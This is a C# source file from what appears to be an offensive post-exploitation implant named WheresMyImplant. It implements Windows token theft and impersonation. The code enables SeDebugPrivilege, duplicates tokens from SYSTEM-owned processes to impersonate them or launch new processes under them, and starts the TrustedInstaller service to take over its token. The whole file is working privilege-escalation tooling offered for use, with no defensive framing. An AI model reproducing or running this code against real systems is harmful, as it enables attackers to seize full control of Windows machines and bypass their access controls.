using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    class Tokens : Base, IDisposable
    {
        protected IntPtr phNewToken;
        protected IntPtr hExistingToken;
        private IntPtr currentProcessToken;
        private Dictionary<UInt32, String> processes;

        private delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments);

        private static List<String> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege", 
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", 
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", 
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege", 
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", 
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", 
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", 
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", 
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", 
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", 
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

        ////////////////////////////////////////////////////////////////////////////////
        // Default Constructor
        ////////////////////////////////////////////////////////////////////////////////
        public Tokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                WriteOutput("[-] Administrator privileges required");
            }

            currentProcessToken = new IntPtr();
            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
        }

        protected Tokens(Boolean rt)
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();

            currentProcessToken = new IntPtr();
            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
        }

        public void Dispose()
        {
            kernel32.CloseHandle(phNewToken);
            kernel32.CloseHandle(hExistingToken);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~Tokens()
        {
            Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                WriteOutputBad("DuplicateTokenEx Failed");
                return false;
            }
            WriteOutputGood(String.Format("Duplicate Token Handle: {0}", phNewToken.ToInt32()));

            Create createProcess;
            if (0 == Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }

            if (!createProcess(phNewToken, newProcess, ""))
            {
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean ImpersonateUser(Int32 processId)
        {
            WriteOutputNeutral(String.Format("Impersonating {0}", processId));
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                WriteOutputBad("DuplicateTokenEx Failed");
                return false;
            }
            WriteOutputGood(String.Format("Duplicate Token Handle: {0}", phNewToken.ToInt32()));
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                WriteOutputBad("ImpersonateLoggedOnUser Failed");
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a new process as SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem(String newProcess)
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            WriteOutputNeutral(String.Format("Searching for {0}", systemAccount.ToString()));
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (UInt32 process in processes.Keys)
            {
                if (StartProcessAsUser((Int32)process, newProcess))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            WriteOutputNeutral(String.Format("Searching for {0}", systemAccount.ToString()));
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (UInt32 process in processes.Keys)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a process as SYSTEM w/ Trusted Installer Group
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetTrustedInstaller(String newProcess)
        {
            WriteOutputGood("Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            WriteOutputNeutral(String.Format("Running as: {0}", WindowsIdentity.GetCurrent().Name));

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                WriteOutputBad("StartService");
                return false;
            }

            if (!StartProcessAsUser((Int32)services.GetServiceProcessId(), newProcess))
            {
                WriteOutputBad("StartProcessAsUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM w/ Trusted Installer Group
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetTrustedInstaller()
        {
            WriteOutputNeutral("Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            WriteOutputGood(String.Format("Running as: {0}", WindowsIdentity.GetCurrent().Name));

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                WriteOutputBad("StartService");
                return false;
            }

            if (!ImpersonateUser((Int32)services.GetServiceProcessId()))
            {
                WriteOutputBad("ImpersonateUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hToken to a processes primary token
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            WriteOutputGood(String.Format("Recieved Handle for: {0} (1)", name, processId));
            WriteOutputGood(String.Format("Process Handle: {0}", hProcess.ToInt32()));

            if (!kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
            {
                return false;
            }
            WriteOutputGood("Primary Token Handle: " + hExistingToken.ToInt32());
            kernel32.CloseHandle(hProcess);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Opens a thread token
        ////////////////////////////////////////////////////////////////////////////////
        private IntPtr OpenThreadTokenChecked()
        {
            IntPtr hToken = new IntPtr();
            WriteOutputNeutral("Opening Thread Token");
            if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
            {
                WriteOutput("[-] OpenTheadToken Failed");
                WriteOutputNeutral("Impersonating Self");
                if (!advapi32.ImpersonateSelf(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    WriteOutputBad("ImpersonateSelf");
                    return IntPtr.Zero;
                }
                WriteOutputGood("Impersonated Self");
                WriteOutputNeutral("Retrying");
                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                {
                    WriteOutputBad("OpenThreadToken");
                    return IntPtr.Zero;
                }
            }
            WriteOutputGood(String.Format("Recieved Thread Token Handle: 0x{0}", hToken.ToString("X4")));
            return hToken;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public void UnSetTokenPrivilege(ref IntPtr hToken, String privilege)
        {
            WriteOutputNeutral("Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID luid = new Winnt._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                WriteOutputBad("LookupPrivilegeValue");
                return;
            }
            WriteOutputGood("Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = 0;

            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            WriteOutputGood("AdjustTokenPrivilege Pass 1");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                WriteOutputBad("AdjustTokenPrivileges - 1");
                return;
            }

            previousState.Privileges.Attributes ^= (Constants.SE_PRIVILEGE_ENABLED & previousState.Privileges.Attributes);


            ////////////////////////////////////////////////////////////////////////////////
            Winnt._TOKEN_PRIVILEGES kluge = new Winnt._TOKEN_PRIVILEGES();
            WriteOutputGood("djustTokenPrivilege Pass 2");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
            {
                WriteOutputBad("AdjustTokenPrivileges - 2");
                return;
            }

            WriteOutputGood(String.Format("Adjusted Token to: {0}", privilege));
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public void SetTokenPrivilege(ref IntPtr hToken, String privilege)
        {
            if (!validPrivileges.Contains(privilege))
            {
                WriteOutputBad("Invalid Privilege Specified");
                return;
            }
            WriteOutputNeutral("Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID luid = new Winnt._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                WriteOutputBad("LookupPrivilegeValue");
                return;
            }
            WriteOutputGood("Received luid");

            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Constants.SE_PRIVILEGE_ENABLED;

            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            WriteOutputNeutral("AdjustTokenPrivilege");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                WriteOutputBad("AdjustTokenPrivileges");
                return;
            }

            WriteOutputGood("Adjusted Token to: " + privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Prints the tokens privileges
        ////////////////////////////////////////////////////////////////////////////////
        public void EnumerateTokenPrivileges(IntPtr hToken)
        {
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 TokenInfLength = 0;
            WriteOutputNeutral("Enumerating Token Privileges");
            advapi32.GetTokenInformation(
                hToken,
                Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges,
                IntPtr.Zero,
                TokenInfLength,
                out TokenInfLength
            );

            if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)
            {
                WriteOutputBad("GetTokenInformation - 1 " + TokenInfLength);
                return;
            }
            WriteOutputNeutral("GetTokenInformation - Pass 1");
            IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength);

            ////////////////////////////////////////////////////////////////////////////////
            if (!advapi32.GetTokenInformation(
                hToken,
                Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges,
                lpTokenInformation,
                TokenInfLength,
                out TokenInfLength))
            {
                WriteOutputBad("GetTokenInformation - 2" + TokenInfLength);
                return;
            }
            WriteOutputNeutral("GetTokenInformation - Pass 2");
            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Winnt._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Winnt._TOKEN_PRIVILEGES_ARRAY));
            WriteOutputGood(String.Format("Enumerated {0} Privileges", tokenPrivileges.PrivilegeCount));

            WriteOutput("");
            WriteOutput(String.Format("{0,-30}{1,-30}", "Privilege Name", "Enabled"));
            WriteOutput(String.Format("{0,-30}{1,-30}", "--------------", "-------"));
            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
            {
                StringBuilder lpName = new StringBuilder();
                Int32 cchName = 0;
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);

                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                if (cchName < 0 || cchName > Int32.MaxValue)
                {
                    WriteOutputBad(String.Format("LookupPrivilegeName ", cchName));
                    return;
                }

                lpName.EnsureCapacity(cchName + 1);
                if (!advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                {
                    WriteOutputBad("Privilege Name Lookup Failed");
                    continue;
                }

                Winnt._PRIVILEGE_SET privilegeSet = new Winnt._PRIVILEGE_SET();
                privilegeSet.PrivilegeCount = 1;
                privilegeSet.Control = Winnt.PRIVILEGE_SET_ALL_NECESSARY;
                privilegeSet.Privilege = new Winnt._LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] };

                IntPtr pfResult;
                if (!advapi32.PrivilegeCheck(hToken, privilegeSet, out pfResult))
                {
                    WriteOutputBad("Privilege Check Failed");
                    continue;
                }
                WriteOutput(String.Format("{0,-30}{1,-30}", lpName.ToString(), Convert.ToBoolean(pfResult.ToInt32())));

                Marshal.FreeHGlobal(lpLuid);
            }
            WriteOutput("");
        }
    }
}
